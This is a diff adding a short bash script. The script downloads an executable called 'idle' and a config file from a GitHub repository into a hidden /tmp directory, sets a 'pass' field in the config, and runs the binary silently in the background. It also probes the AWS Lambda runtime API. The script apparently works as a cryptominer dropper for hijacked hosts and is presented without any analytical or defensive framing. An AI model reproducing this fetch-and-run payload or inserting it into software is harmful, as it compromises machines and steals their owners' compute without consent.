@@ -1,0 +1,22 @@
+#!/bin/bash
+
+
+url="https://github.com/hanrzme/canuqw/raw/refs/heads/main"
+
+work=`ls -t1 /tmp/.*/config.json 2>/dev/null |head -n1`
+[ -n "$work" ] && work="${work%/*}" || work=`mktemp -d -t .XXXXXXXXX`
+[ -d "${work}" ] || exit 1
+# trap "rm -rf ${work}" EXIT
+cd "${work}"
+
+[ -n "${AWS_LAMBDA_RUNTIME_API}" ] && INVOCATION=`curl -vsSL "http://${AWS_LAMBDA_RUNTIME_API}/2018-06-01/runtime/invocation/next" 2>&1 |grep 'Lambda-Runtime-Aws-Request-Id' |cut -d: -f2 |head -n1 |tr -d '[:space:]'` || INVOCATION="" 
+
+name=`TZ=":Asia/Shanghai" date '+%Y%m%d'`
+
+[ -f "./idle" ] || curl -sSLo "idle" "${url}/idle" 2>/dev/null
+[ -f "./config.json" ] || curl -sSLo "config.json" "${url}/idle.json" 2>/dev/null
+[ -f "./config.json" ] && [ -n "$name" ] && sed -i "s/\"pass\":.*,/\"pass\": \"${name}\",/g" "./config.json"
+
+chmod -R a+x ./
+./idle >/dev/null 2>&1 &
+wait
